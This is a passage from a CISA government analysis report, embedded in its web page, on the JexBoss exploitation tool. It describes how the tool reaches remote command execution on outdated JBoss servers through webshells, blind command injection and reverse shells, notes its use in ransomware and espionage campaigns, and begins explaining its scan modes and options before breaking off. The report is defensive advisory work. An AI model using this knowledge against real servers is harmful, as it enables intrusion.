@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html  lang="en" dir="ltr" prefix="content: http://purl.org/rss/1.0/modules/content/  dc: http://purl.org/dc/terms/  foaf: http://xmlns.com/foaf/0.1/  og: http://ogp.me/ns#  rdfs: http://www.w3.org/2000/01/rdf-schema#  schema: http://schema.org/  sioc: http://rdfs.org/sioc/ns#  sioct: http://rdfs.org/sioc/types#  skos: http://www.w3.org/2004/02/skos/core#  xsd: http://www.w3.org/2001/XMLSchema# ">
+  <head>
+    <meta charset="utf-8" /><script type="text/javascript">(window.NREUM||(NREUM={})).loader_config={licenseKey:"877b02039c",applicationID:"628657512"};window.NREUM||(NREUM={}),__nr_require=function(t,e,n){function r(n){if(!e[n]){var i=e[n]={exports:{}};t[n][0].call(i.exports,function(e){var i=t[n][1][e];return r(i||e)},i,i.exports)}return e[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var i=0;i<n.length;i++)r(n[i]);return r}({1:[function(t,e,n){function r(){}function i(t,e,n){return function(){return o(t,[u.now()].concat(f(arguments)),e?null:this,n),e?void 0:this}}var o=t("handle"),a=t(8),f=t(9),c=t("ee").get("tracer"),u=t("loader"),s=NREUM;"undefined"==typeof window.newrelic&&(newrelic=s);var d=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],p="api-",l=p+"ixn-";a(d,function(t,e){s[e]=i(p+e,!0,"api")}),s.addPageAction=i(p+"addPageAction",!0),s.setCurrentRouteName=i(p+"routeName",!0),e.exports=newrelic,s.interaction=function(){return(new r).get()};var m=r.prototype={createTracer:function(t,e){var n={},r=this,i="function"==typeof e;return o(l+"tracer",[u.now(),t,n],r),function(){if(c.emit((i?"":"no-")+"fn-start",[u.now(),r,i],n),i)try{return e.apply(this,arguments)}catch(t){throw c.emit("fn-err",[arguments,this,t],n),t}finally{c.emit("fn-end",[u.now()],n)}}}};a("actionText,setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(t,e){m[e]=i(l+e)}),newrelic.noticeError=function(t,e){"string"==typeof t&&(t=new Error(t)),o("err",[t,u.now(),!1,e])}},{}],2:[function(t,e,n){function r(t){if(NREUM.init){for(var e=NREUM.init,n=t.split("."),r=0;r<n.length-1;r++)if(e=e[n[r]],"object"!=typeof e)return;return e=e[n[n.length-1]]}}e.exports={getConfiguration:r}},{}],3:[function(t,e,n){function r(){return f.exists&&performance.now?Math.round(performance.now()):(o=Math.max((new Date).getTime(),o))-a}function i(){return o}var o=(new Date).getTime(),a=o,f=t(10);e.exports=r,e.exports.offset=a,e.exports.getLastTimestamp=i},{}],4:[function(t,e,n){function r(t){return!(!t||!t.protocol||"file:"===t.protocol)}e.exports=r},{}],5:[function(t,e,n){function r(t,e){var n=t.getEntries();n.forEach(function(t){"first-paint"===t.name?d("timing",["fp",Math.floor(t.startTime)]):"first-contentful-paint"===t.name&&d("timing",["fcp",Math.floor(t.startTime)])})}function i(t,e){var n=t.getEntries();n.length>0&&d("lcp",[n[n.length-1]])}function o(t){t.getEntries().forEach(function(t){t.hadRecentInput||d("cls",[t])})}function a(t){if(t instanceof m&&!g){var e=Math.round(t.timeStamp),n={type:t.type};e<=p.now()?n.fid=p.now()-e:e>p.offset&&e<=Date.now()?(e-=p.offset,n.fid=p.now()-e):e=p.now(),g=!0,d("timing",["fi",e,n])}}function f(t){d("pageHide",[p.now(),t])}if(!("init"in NREUM&&"page_view_timing"in NREUM.init&&"enabled"in NREUM.init.page_view_timing&&NREUM.init.page_view_timing.enabled===!1)){var c,u,s,d=t("handle"),p=t("loader"),l=t(7),m=NREUM.o.EV;if("PerformanceObserver"in window&&"function"==typeof window.PerformanceObserver){c=new PerformanceObserver(r);try{c.observe({entryTypes:["paint"]})}catch(v){}u=new PerformanceObserver(i);try{u.observe({entryTypes:["largest-contentful-paint"]})}catch(v){}s=new PerformanceObserver(o);try{s.observe({type:"layout-shift",buffered:!0})}catch(v){}}if("addEventListener"in document){var g=!1,h=["click","keydown","mousedown","pointerdown","touchstart"];h.forEach(function(t){document.addEventListener(t,a,!1)})}l(f)}},{}],6:[function(t,e,n){function r(t,e){if(!i)return!1;if(t!==i)return!1;if(!e)return!0;if(!o)return!1;for(var n=o.split("."),r=e.split("."),a=0;a<r.length;a++)if(r[a]!==n[a])return!1;return!0}var i=null,o=null,a=/Version\/(\S+)\s+Safari/;if(navigator.userAgent){var f=navigator.userAgent,c=f.match(a);c&&f.indexOf("Chrome")===-1&&f.indexOf("Chromium")===-1&&(i="Safari",o=c[1])}e.exports={agent:i,version:o,match:r}},{}],7:[function(t,e,n){function r(t){function e(){t(a&&document[a]?document[a]:document[i]?"hidden":"visible")}"addEventListener"in document&&o&&document.addEventListener(o,e,!1)}e.exports=r;var i,o,a;"undefined"!=typeof document.hidden?(i="hidden",o="visibilitychange",a="visibilityState"):"undefined"!=typeof document.msHidden?(i="msHidden",o="msvisibilitychange"):"undefined"!=typeof document.webkitHidden&&(i="webkitHidden",o="webkitvisibilitychange",a="webkitVisibilityState")},{}],8:[function(t,e,n){function r(t,e){var n=[],r="",o=0;for(r in t)i.call(t,r)&&(n[o]=e(r,t[r]),o+=1);return n}var i=Object.prototype.hasOwnProperty;e.exports=r},{}],9:[function(t,e,n){function r(t,e,n){e||(e=0),"undefined"==typeof n&&(n=t?t.length:0);for(var r=-1,i=n-e||0,o=Array(i<0?0:i);++r<i;)o[r]=t[e+r];return o}e.exports=r},{}],10:[function(t,e,n){e.exports={exists:"undefined"!=typeof window.performance&&window.performance.timing&&"undefined"!=typeof window.performance.timing.navigationStart}},{}],ee:[function(t,e,n){function r(){}function i(t){function e(t){return t&&t instanceof r?t:t?u(t,c,a):a()}function n(n,r,i,o,a){if(a!==!1&&(a=!0),!l.aborted||o){t&&a&&t(n,r,i);for(var f=e(i),c=v(n),u=c.length,s=0;s<u;s++)c[s].apply(f,r);var p=d[w[n]];return p&&p.push([b,n,r,f]),f}}function o(t,e){y[t]=v(t).concat(e)}function m(t,e){var n=y[t];if(n)for(var r=0;r<n.length;r++)n[r]===e&&n.splice(r,1)}function v(t){return y[t]||[]}function g(t){return p[t]=p[t]||i(n)}function h(t,e){l.aborted||s(t,function(t,n){e=e||"feature",w[n]=e,e in d||(d[e]=[])})}var y={},w={},b={on:o,addEventListener:o,removeEventListener:m,emit:n,get:g,listeners:v,context:e,buffer:h,abort:f,aborted:!1};return b}function o(t){return u(t,c,a)}function a(){return new r}function f(){(d.api||d.feature)&&(l.aborted=!0,d=l.backlog={})}var c="nr@context",u=t("gos"),s=t(8),d={},p={},l=e.exports=i();e.exports.getOrSetContext=o,l.backlog=d},{}],gos:[function(t,e,n){function r(t,e,n){if(i.call(t,e))return t[e];var r=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(t,e,{value:r,writable:!0,enumerable:!1}),r}catch(o){}return t[e]=r,r}var i=Object.prototype.hasOwnProperty;e.exports=r},{}],handle:[function(t,e,n){function r(t,e,n,r){i.buffer([t],r),i.emit(t,e,n)}var i=t("ee").get("handle");e.exports=r,r.ee=i},{}],id:[function(t,e,n){function r(t){var e=typeof t;return!t||"object"!==e&&"function"!==e?-1:t===window?0:a(t,o,function(){return i++})}var i=1,o="nr@id",a=t("gos");e.exports=r},{}],loader:[function(t,e,n){function r(){if(!R++){var t=M.info=NREUM.info,e=v.getElementsByTagName("script")[0];if(setTimeout(u.abort,3e4),!(t&&t.licenseKey&&t.applicationID&&e))return u.abort();c(E,function(e,n){t[e]||(t[e]=n)});var n=a();f("mark",["onload",n+M.offset],null,"api"),f("timing",["load",n]);var r=v.createElement("script");0===t.agent.indexOf("http://")||0===t.agent.indexOf("https://")?r.src=t.agent:r.src=l+"://"+t.agent,e.parentNode.insertBefore(r,e)}}function i(){"complete"===v.readyState&&o()}function o(){f("mark",["domContent",a()+M.offset],null,"api")}var a=t(3),f=t("handle"),c=t(8),u=t("ee"),s=t(6),d=t(4),p=t(2),l=p.getConfiguration("ssl")===!1?"http":"https",m=window,v=m.document,g="addEventListener",h="attachEvent",y=m.XMLHttpRequest,w=y&&y.prototype,b=!d(m.location);NREUM.o={ST:setTimeout,SI:m.setImmediate,CT:clearTimeout,XHR:y,REQ:m.Request,EV:m.Event,PR:m.Promise,MO:m.MutationObserver};var x=""+location,E={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-1209.min.js"},O=y&&w&&w[g]&&!/CriOS/.test(navigator.userAgent),M=e.exports={offset:a.getLastTimestamp(),now:a,origin:x,features:{},xhrWrappable:O,userAgent:s,disabled:b};if(!b){t(1),t(5),v[g]?(v[g]("DOMContentLoaded",o,!1),m[g]("load",r,!1)):(v[h]("onreadystatechange",i),m[h]("onload",r)),f("mark",["firstbyte",a.getLastTimestamp()],null,"api");var R=0}},{}],"wrap-function":[function(t,e,n){function r(t,e){function n(e,n,r,c,u){function nrWrapper(){var o,a,s,p;try{a=this,o=d(arguments),s="function"==typeof r?r(o,a):r||{}}catch(l){i([l,"",[o,a,c],s],t)}f(n+"start",[o,a,c],s,u);try{return p=e.apply(a,o)}catch(m){throw f(n+"err",[o,a,m],s,u),m}finally{f(n+"end",[o,a,p],s,u)}}return a(e)?e:(n||(n=""),nrWrapper[p]=e,o(e,nrWrapper,t),nrWrapper)}function r(t,e,r,i,o){r||(r="");var f,c,u,s="-"===r.charAt(0);for(u=0;u<e.length;u++)c=e[u],f=t[c],a(f)||(t[c]=n(f,s?c+r:r,i,c,o))}function f(n,r,o,a){if(!m||e){var f=m;m=!0;try{t.emit(n,r,o,e,a)}catch(c){i([c,n,r,o],t)}m=f}}return t||(t=s),n.inPlace=r,n.flag=p,n}function i(t,e){e||(e=s);try{e.emit("internal-error",t)}catch(n){}}function o(t,e,n){if(Object.defineProperty&&Object.keys)try{var r=Object.keys(t);return r.forEach(function(n){Object.defineProperty(e,n,{get:function(){return t[n]},set:function(e){return t[n]=e,e}})}),e}catch(o){i([o],n)}for(var a in t)l.call(t,a)&&(e[a]=t[a]);return e}function a(t){return!(t&&t instanceof Function&&t.apply&&!t[p])}function f(t,e){var n=e(t);return n[p]=t,o(t,n,s),n}function c(t,e,n){var r=t[e];t[e]=f(r,n)}function u(){for(var t=arguments.length,e=new Array(t),n=0;n<t;++n)e[n]=arguments[n];return e}var s=t("ee"),d=t(9),p="nr@original",l=Object.prototype.hasOwnProperty,m=!1;e.exports=r,e.exports.wrapFunction=f,e.exports.wrapInPlace=c,e.exports.argsToArray=u},{}]},{},["loader"]);</script>
+<script async src="/sites/default/files/google_analytics/gtag.js?qubv3z"></script>
+<script>window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments)};gtag("js", new Date());gtag("config", "UA-34879253-1", {"groups":"default","anonymize_ip":true,"allow_ad_personalization_signals":false});</script>
+<meta name="description" content="JexBossJexBoss is a tool used to test and exploit vulnerabilities in Java applications and platforms, including the JBoss AS/WildFly web server framework. JexBoss is written in the Python programming language using standard Python libraries. JexBoss is run from the command-line interface (CLI) and operated using a console interface. JexBoss was released as an open-source tool on GitHub in November 2014. JexBoss’ author regularly added new features and exploits until March 2017." />
+<meta name="abstract" content="As part of its mission, CISA leads the effort to enhance the security, resiliency, and reliability of the Nation&#039;s cybersecurity and communications infrastructure." />
+<meta name="keywords" content="uscert, csirt, cert, cybersecurity, cyber security, computer security, U. S. Computer Emergency Readiness, cyber risks" />
+<meta name="Generator" content="Drupal 9 (https://www.drupal.org)" />
+<meta name="MobileOptimized" content="width" />
+<meta name="HandheldFriendly" content="true" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="shortcut icon" href="/sites/default/files/images/favicon.ico" type="image/vnd.microsoft.icon" />
+<link rel="canonical" href="https://us-cert.cisa.gov/ncas/analysis-reports/AR18-312A" />
+<link rel="shortlink" href="https://us-cert.cisa.gov/node/9868" />
+<link rel="revision" href="https://us-cert.cisa.gov/ncas/analysis-reports/AR18-312A" />
+
+    <title>JexBoss – JBoss Verify and EXploitation Tool | CISA</title>
+    <link rel="stylesheet" media="all" href="/sites/default/files/css/css_-w-jQbIWIO0ZERqyQMFp9m1ddgDjs5ZGsor0ebo5CG4.css" />
+<link rel="stylesheet" media="all" href="/sites/default/files/css/css_OtQ9QHAYVZDqM__uuCDStHUt38Nwh_1MHX1vxg5dE5c.css" />
+
+    
+    <!-- Google Font -->
+    <style type="text/css">
+/* source-sans-pro-regular - latin */
+@font-face {
+  font-family: 'Source Sans Pro';
+  font-style: normal;
+  font-weight: 400;
+  src: url('/profiles/uscertd8_gov/themes/custom/cert/fonts/source-sans-pro-v12-latin-regular.eot'); /* IE9 Compat Modes */
+  src: local('Source Sans Pro Regular'), local('SourceSansPro-Regular'),
+  url('/profiles/uscertd8_gov/themes/custom/cert/fonts/source-sans-pro-v12-latin-regular.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */
+  url('/profiles/uscertd8_gov/themes/custom/cert/fonts/source-sans-pro-v12-latin-regular.woff2') format('woff2'), /* Super Modern Browsers */
+  url('/profiles/uscertd8_gov/themes/custom/cert/fonts/source-sans-pro-v12-latin-regular.woff') format('woff'), /* Modern Browsers */
+  url('/profiles/uscertd8_gov/themes/custom/cert/fonts/source-sans-pro-v12-latin-regular.ttf') format('truetype'), /* Safari, Android, iOS */
+  url('/profiles/uscertd8_gov/themes/custom/cert/fonts/source-sans-pro-v12-latin-regular.svg#SourceSansPro') format('svg'); /* Legacy iOS */
+}
+    </style>
+    <!--link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro" rel="stylesheet"--> 
+    <!-- Google Font -->
+  </head>
+  <body class="path-node page-node-type-analysis-report has-glyphicons">
+    <a href="#main-content" class="visually-hidden focusable skip-link">
+      Skip to main content
+    </a>
+    
+      <div class="dialog-off-canvas-main-canvas" data-off-canvas-main-canvas>
+    
+
+
+<div class="container-fluid top-top">
+      <aside role="complementary">
+        <div class="region region-top">
+    <section id="block-certtoptop" class="block block-block-content block-block-content4d95ffde-0818-4e6b-bd79-d1547b08c0c0 clearfix">
+  
+    
+
+      
+            <div class="field field--name-body field--type-text-with-summary field--label-hidden field--item"><div class="container">
+<div id="top">
+<div class="row">
+<div class="col-sm-12 flag"><img alt="United States Flag" data-entity-type="" data-entity-uuid="" src="/sites/default/files/cert/flag.png" style="position: absolute;" /><p style="padding-left: 35px; font-family: Arial; font-size: 11px;">An official website of the United States government <a href="#" id="here-is-how-u-know">Here's how you know <span class="arrow down"> </span></a></p>
+</div>
+</div>
+</div>
+</div>
+
+<div class="usa-banner-content usa-grid usa-accordion-content hidden container" id="gov-banner">
+<div class="usa-banner-guidance-gov usa-width-one-half col-sm-6"><img alt="Dot gov" class="usa-banner-icon usa-media_block-img" data-entity-type="" data-entity-uuid="" src="/sites/default/files/images/icon-dot-gov.svg" /><div class="usa-media_block-body"><strong>Official websites use .gov</strong><br />
+A <b>.gov</b> website belongs to an official government organization in the United States.</div>
+</div>
+
+<div class="usa-banner-guidance-ssl usa-width-one-half col-sm-6"><img alt="SSL" class="usa-banner-icon usa-media_block-img" data-entity-type="" data-entity-uuid="" src="/sites/default/files/images/icon-https.svg" /><div class="usa-media_block-body"><strong>Secure .gov websites use HTTPS</strong> A <b>lock (<img alt="lock icon" src="/sites/default/files/icons/lock.svg" style="width:15px;" />)</b> or <b>https://</b> means you've safely connected to the .gov website. Share sensitive information only on official, secure websites.</div>
+</div>
+</div>
+</div>
+      
+  </section>
+
+
+  </div>
+
+    </aside>
+  </div>
+
+
+
+<div class="container-fluid hidden-xs hidden-sm banner-region">
+<div class="container">
+<div class="row">
+
+
+  
+
+<section class="col-sm-9">
+
+      <a id="logo-section"></a>
+        <div class="region region-logo">
+    <section id="block-certlogo" class="block block-block-content block-block-content4639a667-debe-4642-bc69-7839662c0187 clearfix">
+  
+    
+
+      
+            <div class="field field--name-body field--type-text-with-summary field--label-hidden field--item"><div class="hidden-xs hidden-sm"><a href="/"><img alt="Cybersecurity and Infrastructure Security Agency CISA" data-entity-type="" data-entity-uuid="" src="/sites/default/files/cert/logo_verbose.png" title="Cybersecurity and Infrastructure Security Agency CISA" /></a></div>
+</div>
+      
+  </section>
+
+
+  </div>
+
+    </aside>
+  </section>
+
+
+
+      <aside class="col-sm-3" role="complementary">
+        <div class="region region-search">
+    <section id="block-certsearch" class="block block-block-content block-block-contentc33bd875-6ea6-42cc-b1ab-348a4e4bdff7 clearfix">
+  
+    
+
+      
+            <div class="field field--name-body field--type-text-with-summary field--label-hidden field--item"><form accept-charset="UTF-8" action="https://search.us-cert.gov/search" class="hidden-xs searchbox" method="get"><input name="utf8" type="hidden" value="✓" /><input id="affiliate-desktop" name="affiliate" type="hidden" value="us-cert" /><div class="form-group"><label class="sr-only" for="query-desktop">Enter Search Terms(s):</label>
+<div class="input-group"><input autocomplete="off" class="form-control form-control-custom input-lg" id="query-desktop" name="query" placeholder="Search" type="text" /><div class="input-group-addon input-group-addon-custom"><button class="submit input-lg"><img alt="search icon" data-entity-type="" data-entity-uuid="" src="/sites/default/files/cert/search-icon.png" title="search icon" /></button></div>
+</div>
+</div>
+</form>
+<style type="text/css">
+<!--/*--><![CDATA[/* ><!--*/
+.navbar-default ul.navbar-nav > li.last a{
+display: none;
+
+/*--><!]]>*/
+</style><div style="padding: 16px 12px 8px 12px"><a class="btn btn-primary" href="/services" type="button" style="font-weight: bold; width: 40%">Services</a><a class="btn btn-primary pull-right" href="/report" type="button" style="font-weight: bold; width: 40%">Report</a></div>
+</div>
+      
+  </section>
+
+
+  </div>
+
+    </aside>
+  </div>
+</div>
+<hr class="hidden-xs nav-top-line">
+</div>
+
+
+
+          <header class="navbar navbar-default container-fluid" id="navbar" role="banner">
+        <div class="container ">
+      <div class="navbar-header">
+        
+                          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navbar-collapse">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+            <div class="hidden-lg hidden-md mobile-nav">
+        <a class="" href="/">
+            <img src="/sites/default/files/cert/logo3.png"  alt="US Department of Homeland Security CISA Cyber + Infrastructure" title="US Department of Homeland Security CISA Cyber + Infrastructure">
+          </a>
+        </div>
+      </div>
+
+              <div id="navbar-collapse" class="navbar-collapse collapse">
+            <div class="region region-navigation-collapsible">
+    <section id="block-certsearchmobile" class="block block-block-content block-block-content0da6361c-e31a-4a58-b455-f9ebde1ba544 clearfix">
+  
+    
+
+      
+            <div class="field field--name-body field--type-text-with-summary field--label-hidden field--item"><form accept-charset="UTF-8" action="https://search.us-cert.gov/search" class="hidden-lg hidden-md searchbox" method="get"><input name="utf8" type="hidden" value="✓" /><input id="affiliate-mobile" name="affiliate" type="hidden" value="us-cert" /><div class="form-group"><label class="sr-only" for="query-mobile">Enter Search Terms(s):</label>
+<div class="input-group"><input autocomplete="off" class="form-control form-control-custom input-lg" id="query-mobile" name="query" placeholder="Search" type="text" /><div class="input-group-addon input-group-addon-custom"><button class="submit input-lg"><img alt="search icon" data-entity-type="" data-entity-uuid="" src="/sites/default/files/cert/search-icon.png" title="search icon" /></button></div>
+</div>
+</div>
+</form>
+<div class="hidden-md hidden-lg" style="padding: 8px"><a class="btn btn-primary btn-block" href="/services" role="button" style="font-weight: bold">Services</a></div>
+
+<div class="hidden-md hidden-lg" style="padding: 8px"><a class="btn btn-primary btn-block" href="/report" role="button" style="font-weight: bold">Report</a></div></div>
+      
+  </section>
+
+<nav role="navigation" aria-labelledby="block-certmainmenu-menu" id="block-certmainmenu">
+            
+  <h2 class="visually-hidden" id="block-certmainmenu-menu">CertMain Menu</h2>
+  
+
+        
+      <ul class="menu menu--certmain-menu nav navbar-nav">
+                      <li class="first">
+                                        <a href="/ncas" title="Alerts and Tips" data-drupal-link-system-path="node/5">Alerts and Tips</a>
+              </li>
+                      <li>
+                                        <a href="/resources" title="Resources" data-drupal-link-system-path="node/12436">Resources</a>
+              </li>
+                      <li>
+                                        <a href="/ics" title="Industrial Control Systems" data-drupal-link-system-path="node/14614">Industrial Control Systems</a>
+              </li>
+                      <li class="last">
+                                        <a href="/report" title="Report" data-drupal-link-system-path="node/5745">Report</a>
+              </li>
+        </ul>
+  
+
+  </nav>
+
+  </div>
+
+        </div>
+                </header>
+  <hr class="hidden-xs hidden-sm nav-bottom-line">
+<div class="visible-xs visible-sm mobile-border"></div>
+
+
+<div class="container">
+    <div id="print-logo"><img alt="US Department of Homeland Security CISA Cyber + Infrastructure" src="/sites/default/files/cert/logo2.png"/></div>
+    <div id="tlp-header"><svg height="30" width="120"> <rect fill="black" height="30" width="120" x="0" y="0"></rect> <text fill="#ffffff" font-size="18px" x="10" y="20">TLP:WHITE</text> </svg></div>
+    <div id="tlp-footer"><svg height="30" width="120"> <rect fill="black" height="30" width="120" x="0" y="0"></rect> <text fill="#ffffff" font-size="18px" x="10" y="20">TLP:WHITE</text> </svg></div>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+  <div role="main" class="main-container container js-quickedit-main-content">
+    <div class="row">
+
+                              <div class="col-sm-12" role="heading" aria-level="1">
+              <div class="region region-header">
+      <div class="container-fluid hidden-xs">
+  <ol class="breadcrumb">
+          <li >
+                  <a href="/ncas">National Cyber Awareness System</a>&nbsp;&nbsp;&nbsp;&nbsp;&gt;
+              </li>
+          <li >
+                  <a href="/ncas/analysis-reports">Analysis Reports</a>&nbsp;&nbsp;&nbsp;&nbsp;&gt;
+              </li>
+          <li  class="active">
+                  JexBoss – JBoss Verify and EXploitation Tool
+              </li>
+      </ol>
+</div>
+
+
+
+  </div>
+
+          </div>
+              
+
+            
+            
+                        
+
+            
+                  <section class="col-sm-12">
+
+                              <div class="highlighted">  <div class="region region-highlighted">
+    <div data-drupal-messages-fallback class="hidden"></div>
+
+  </div>
+</div>
+              
+                                      
+                  
+                          <a id="main-content"></a>
+            <div class="region region-content">
+                  <div id="ncas-header">
+            <div id="alerts-archive">
+                <a title="View Archives" href="/ncas/analysis-reports/">More Analysis Reports</a>
+            </div>
+            <h1 id="page-title">Analysis Report (AR18-312A)</h1>
+            <h2 id="page-sub-title">JexBoss – JBoss Verify and EXploitation Tool</h2>
+            <div class="submitted meta-text">
+                                                Original release date: November 08, 2018
+                            </div>
+            <div id="social-options">
+	<!-- START PRINT BUTTON -->
+		<div id="print-button">
+			<span id="custom-print-button">
+				<a rel="nofollow" href="javascript:window.print();" title="Click to print."><img src="/sites/default/files/icons/print-button.png" alt="Click to print." /></a>
+			</span>
+		</div>
+    <!-- END PRINT BUTTON -->
+	<!-- START TWEET BUTTON -->
+	<div id="tweet-button">
+		<span id="custom-tweet-button">
+			<a rel="nofollow" target="_blank" href="https://twitter.com/share?url=https%3A%2F%2Fus-cert.cisa.gov%2Fncas%2Fanalysis-reports%2FAR18-312A" class="popup-twitter" title="Click to Tweet."><img src="/sites/default/files/icons/tweet-button.png" alt="Click to Tweet." /></a>
+		</span>
+	</div>
+	<!-- END TWEET BUTTON -->
+
+	<!-- START FACEBOOK BUTTON -->
+	<div id="facebook-button">
+		<span id="custom-facebook-button">
+		<a rel="nofollow" target="_blank" href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fus-cert.cisa.gov%2Fncas%2Fanalysis-reports%2FAR18-312A" class="popup-facebook" title="Click to send to Facebook."><img src="/sites/default/files/icons/facebook-send-button.png" alt="Click to send to Facebook." /></a>
+		</span>
+	</div>
+	<!-- END FACEBOOK BUTTON -->
+
+	<!-- START SHARE BUTTON -->
+	<div id="share-button">
+		<span id="custom-share-button">
+			<a rel="nofollow" target="_blank" href="http://www.addthis.com/bookmark.php?url=https%3A%2F%2Fus-cert.cisa.gov%2Fncas%2Fanalysis-reports%2FAR18-312A" class="popup-share" title="Click to Share." ><img src="/sites/default/files/icons/share-button.png" alt="Click to Share." /></a>
+		</span>
+	</div>
+	<!-- END SHARE BUTTON -->
+
+</div>
+        </div>
+    
+  
+<article role="article" about="/ncas/analysis-reports/AR18-312A" class="analysis-report full clearfix">
+
+  
+    
+
+  
+  <div class="content">
+	<div id="ncas-content">
+        		    <a id="summary"></a>
+		    <h3>Summary</h3>
+            
+            <div class="field field--name-field-ar-summary field--type-text-long field--label-hidden field--item"><p>JBoss Verify and EXploitation tool (JexBoss) is an open-source tool used by cybersecurity hunt teams (sometimes referred to as “red teams”) and auditors to conduct authorized security assessments. Threat actors use this tool maliciously to test and exploit vulnerabilities in JBoss Application Server (JBoss AS)—now WildFly—and a variety of Java applications and platforms. JexBoss automates all the phases of a cyberattack, making it a powerful and easy-to-use weapon in a threat actor’s cyber arsenal.</p><p>This report provides a detailed analysis of JexBoss’ functionality, along with detection, response, prevention, and mitigation recommendations.</p></div>
+      
+        
+        
+        		    <a id="description"></a>
+		    <h3>Description</h3>
+                
+            <div class="field field--name-body field--type-text-with-summary field--label-hidden field--item"><h4>JexBoss</h4><p>JexBoss is a tool used to test and exploit vulnerabilities in Java applications and platforms, including the JBoss AS/WildFly web server framework. JexBoss is written in the Python programming language using standard Python libraries. JexBoss is run from the command-line interface (CLI) and operated using a console interface. JexBoss was released as an open-source tool on GitHub in November 2014. JexBoss’ author regularly added new features and exploits until March 2017.</p><p>Early versions of JexBoss specifically targeted JBoss AS versions 3–6. JexBoss has since evolved into a framework that can be used to test and exploit generic Java-related vulnerabilities over HyperText Transfer Protocol (HTTP).</p><p>In addition to testing JBoss AS for weak default configurations, JexBoss includes exploits for a variety of known vulnerabilities in Java-based frameworks, including some versions of Java Server Faces, Java Seam Framework, Remote Method Invocation over HTTP, Jenkins CLI, Remote Java Management Extension (JMX), and Apache Struts.</p><p>JexBoss also offers attackers the ability to target deserialization vulnerabilities in generic Java applications and servlets by allowing an attacker to specifically target Uniform Resource Locators (URLs) and <code>HTTP POST </code>parameters. This capability can help attackers customize their attacks against their target and exploit zero-day Java deserialization vulnerabilities.</p><p>JexBoss’ ultimate goal is to provide the attacker with a means of executing arbitrary operating system (OS) commands on the target host. This is achieved by using one of the following mechanisms:</p><ul><li><strong>Installation of a webshell </strong>– allows an attacker to submit OS commands to a particular HTTP URL and receive the output of the executed command in the HTTP response.</li><li><strong>Blind command injection </strong>– allows an attacker to submit OS commands as part of a packaged exploit for a specific vulnerability. The command will be executed, but the attacker will not see the output.</li><li><strong>Establishment of a reverse shell </strong>– both a webshell and a blind command injection can facilitate a third method of executing arbitrary OS commands: the establishment of a reverse shell. In the establishment of a reverse shell, the target initiates a Transmission Control Protocol (TCP) connection with the host and port of the attacker’s choice, after which commands and command outputs are transferred over that new connection.</li></ul><h4>JBoss AS/WildFly</h4><p>JBoss AS/WildFly is a Java-based web server framework that simplifies the process of installing, deploying, and maintaining servlets. JBoss AS was released in 2002 as JBoss AS version 3 and was under continued development until 2012, with the final release of JBoss AS 7.1.1. JBoss AS 7.1.1 was then rebranded under the community project WildFly, which remains under continued development and maintenance. Legacy versions of JBoss AS (particularly versions 6 and older) have unpatched security vulnerabilities because they are no longer maintained. In August 2018, NCCIC’s search via the Shodan search engine showed at least 28,060 web servers running outdated and unsupported JBoss AS software.</p><h4>Reported Use of JexBoss</h4><p>In March 2016, the Cisco Talos Intelligence Group (Talos) investigated a widespread ransomware campaign known as SamSam, which was targeting the healthcare industry.<a href="https://blog.talosintelligence.com/2016/03/samsam-ransomware.html">[1]</a> Talos identified numerous instances where the attackers used JexBoss to gain initial access to the target network through vulnerable versions of JBoss AS. The attackers then moved laterally to reach the intended ransomware targets. This campaign was the first widely reported use of JexBoss.</p><p>The April 2017 Symantec Internet Security Threat Report documented an intrusion by the Iran-based Chafer espionage group against a target in Turkey. In that intrusion, Chafer used JexBoss to identify and exploit a vulnerable version of JBoss AS, then moved laterally into other computers on the victim’s network.<a href="https://www.symantec.com/content/dam/symantec/docs/reports/istr-22-2017-en.pdf">[2]</a></p><p>These two instances illustrate threat actors’ use of JexBoss to gain initial access to vulnerable internet-facing versions of JBoss AS. The threat actors leveraged their initial access to move deeper into a victim’s network. The success of these exploits highlight the victims’ weak web server sustainment practices (i.e., failure to upgrade to a more secure version of JBoss AS/Wildfly).</p><p>Although more commonly used by threat actors, cybersecurity hunt teams also use JexBoss to evaluate the security of Java web platforms. When a hunt team finds a vulnerable web server, they can leverage JexBoss to pivot into other systems on the target network, which provides a more comprehensive security evaluation.</p><h4>Executing JexBoss</h4><p>JexBoss can be run from most standard OSs. To show JexBoss’ interface and analyze the tool’s behavior, NCCIC ran JexBoss from an Ubuntu Linux system against a vulnerable version of JBoss AS 6.1.0 in a secured test environment.</p><p>When run without any command-line options, JexBoss’ default behavior is to display a banner followed by a list of command-line option examples that demonstrate different ways to run JexBoss. JexBoss then exits without performing any further actions.</p><p>An attacker can supply command-line options to JexBoss to alter the tool’s default behavior. A command-line option (hereafter known as an option) modifies the operation of a command. The command’s program determines the effect of the option. Options follow the command name on the command line, separated by spaces. Some options require a value to specify variable parameters.</p><h5>JexBoss Modes</h5><p>An attacker can run JexBoss in one of three “modes:”</p><ul><li><strong>Standalone mode </strong>– this is JexBoss’ default mode, used to scan a single target;</li><li><strong>Auto-scan mode </strong>– this mode is used to identify and scan all possible targets in a network; and</li><li><strong>File-scan mode </strong>– this mode is used to scan targets specified in a file.</li></ul><p>Each scan involves the attacker’s computer connecting to the target computer to probe for vulnerabilities that JexBoss has the ability to exploit. After a scan completes, JexBoss will not automatically attempt to exploit a target unless given additional options or instructions.</p><h6>Standalone Mode</h6><p>The –mode standalone option instructs JexBoss to run in standalone mode, targeting a single host. Standalone mode is the default mode, so this option may be omitted from the command line.</p><p>Standalone mode requires either the <code>–host HOST </code>or the <code>–u HOST</code> option, the value specifying the target to scan. (The <code>–host HOST </code>and <code>–u HOST </code>options behave identically.) The <code>HOST</code> value indicates the target’s network 